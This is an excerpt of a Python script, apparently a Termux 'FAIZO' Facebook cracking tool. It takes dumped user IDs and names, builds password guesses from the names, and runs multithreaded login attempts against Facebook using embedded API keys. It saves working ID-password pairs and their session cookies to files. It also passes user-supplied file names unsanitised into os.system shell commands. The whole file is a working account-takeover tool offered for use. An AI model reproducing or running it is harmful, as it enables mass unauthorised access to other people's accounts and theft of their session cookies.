#!/usr/bin/python
#Original written By Faizo Balosh
...
from concurrent.futures import ThreadPoolExecutor as sarfrazFAIZO
from string import * 
...
sys.stdout.write('\x1b]2; FAIZO\x07')
S = '\033[1;37m'
A = '\x1b[38;5;208m'
R = '\x1b[38;5;46m'
F = '\x1b[38;5;48m'
...
033[1;37m ####     ###  ##    ####   # ####    ## ##                                                                                    
\033[1;37m------------------------------------------------
\033[1;37m Owner   :            Faizo Baloxh
\033[1;37m Facebook:            Aqeel Ahmed
\033[1;37m Github  :            Faizo421
...
def result(OKs,cps):
    if len(OKs) != 0 or len(cps) != 0:
        ...
        print(47*'-')
        input("Press enter to back FAIZO Menu ")
        exit()
...
class main_crack():
    ...
    def methodA(self, sid, name, psw):
        try:
            global oks,cps,loop
            sys.stdout.write(f"\r {S}[FAIZO] {loop} | M1 OK/CP {len(oks)}/{len(cps)} | {S}{'{:.0%}'.format(loop/float(len(self.id)))}{S}")
            sys.stdout.flush()
            fs = name.split(' ')[0]
            try:
                ls = name.split(' ')[1]
...
'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',}
                ...
                if 'session_key' in q:
                    ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);FAIZOb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={FAIZOb};{ckkk}"
                    print(f"\r{R} [FAIZO-OK] {sid} | {ps} {S}")
                    oks.append(sid)
                    open('/sdcard/FAIZO_OK_ids_M1.txt','a').write(sid+'|'+ps+'\n');open('/sdcard/FAIZO_iDs_COOKiEs_M1.txt','a').write(sid+'|'+ps+'|'+cookie+'\n')
                    break
                elif 'www.facebook.com' in q['error']['message']:
                     #print(f"\r{A} [FAIZO-CP] {sid} | {ps} {S}")
                     cps.append(sid)
                     open('/sdcard/FAIZO_CP.txt','a').write(sid+'|'+ps+'\n')
                else:
                    continue
            loop+=1
    ...
    def methodC(self, sid, name, psw):
        try:
            global oks,cps,loop
            sys.stdout.write(f"\r {S}[FAIZO] {loop} | M3 OK/CP {len(oks)}/{len(cps)} | {S}{'{:.0%}'.format(loop/float(len(self.id)))}{S}")
            sys.stdout.flush()
            fs = name.split(' ')[0]
            try:
                ls = name.split(' ')[1]
...
"api_key": "882a8490361da98702bf97a021ddc14d"}
    ...
    'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36',
                ...
                if 'session_key' in q:
                    ...
                    print(f"\r{R} [FAIZO-OK] {sid} | {ps} {S}")
                    oks.append(sid)
                    open('/sdcard/FAIZO_OK_ids_M2.txt','a').write(sid+'|'+ps+'\n');open('/sdcard/FAIZO_iDs_COOKiEs_M2.txt','a').write(sid+'|'+ps+'|'+cookie+'\n')
                    break
                elif 'www.facebook.com' in q['error']['message']:
                    #  print(f"\r{A} [FAIZO-CP] {sid} | {ps} {S}")
                    cps.append(sid)
    ...
    def methodB(self, sid, name, psw):
        try:
            global oks,cps,loop
            sys.stdout.write(f"\r {S}[FAIZO] {loop} | M2 OK/CP {len(oks)}/{len(cps)} | {S}{'{:.0%}'.format(loop/float(len(self.id)))}{S}")
            sys.stdout.flush()
            fs = name.split(' ')[0]
            try:
                ls = name.split(' ')[1]
...
"api_key": "882a8490361da98702bf97a021ddc14d"}
    ...
    def methodD(self, sid, name, psw):
        global oks,cps,loop
        sys.stdout.write(f"\r {S}[FAIZO] {loop} | M4 OK/CP {len(oks)}/{len(cps)} | {S}{'{:.0%}'.format(loop/float(len(self.id)))}{S}")
        sys.stdout.flush()
        fs = name.split(' ')[0]
        try:
            ls = name.split(' ')[1]
        ...
        try:
            for pw in psw:
                ...
                if 'c_user' in session.cookies.get_dict():
                    print(f"\r{R} [FAIZO-OK] {sid} | {ps} {S}")
                    oks.append(sid)
                    open('/sdcard/FAIZO_OK.txt','a').write(sid+'|'+ps+'\n')
                    break
    ...
    def pasw(self):       
            ...
            print(47*"-")
            with sarfrazFAIZO(max_workers=30) as FAIZOworld:
                for zsb in self.id:
                   try:
                       uid, name = zsb.split('|')
                       sz = name.split(' ')
                       if len(sz) == 3 or len(sz) == 4 or len(sz) == 5 or len(sz) == 8:
                           pwx =  pw
                            ...
                            if 'methodA' in methods:
                                FAIZOworld.submit(self.methodA, uid, name, pwx)
                            elif 'methodB' in methods:
                                FAIZOworld.submit(self.methodB, uid, name, pwx)
                            elif 'methodC' in methods:
                                FAIZOworld.submit(self.methodC, uid, name, pwx)
                            elif 'methodD' in methods:
                                FAIZOworld.submit(self.methodD, uid, name, pwx)
                   except:pass
            result(oks,cps)   
    ...
    try:
        ...
        for rept in range(srange):
            ...
            try:
                ...
                print(f"\n{S}ID Not Found ...");pass
                menu()
        print(f'File Name To Dump Ids. Example /sdcard/FAIZO.txt') 
        print(47*"-")
...
def sids():
    ...
    clear()
    print('\033[1;37mExample: /sdcard/FAIZO.txt\033[0;97m')
    print(47*'-')
...
def cutter():
    ...
    FAIZO = input('Put File Name :')
    print(" ")
    sarfraz = input('Saving Put File Name :')
    os.system('touch ' +sarfraz)
    os.system('sort -r '+FAIZO+' | uniq > '+sarfraz)
    os.system('clear')
    print(logo)
    print("Removed Successful From File : " + FAIZO )
    print(47*'-')
    print("File Saved To :" + sarfraz )
    print(47*'-')
    input(f"{S} Press Enter To Back FAIZO Menu ")
    menu
...
def p_dump():
    ...
    try:
        ...
        srange = int(input('How many IDs do you want to add?: ' ))
        clear()
        print(f'{S}File Name To Dump Ids. Example /sdcard/FAIZO.txt\n') 
        filepath = input("Put File Name: ")
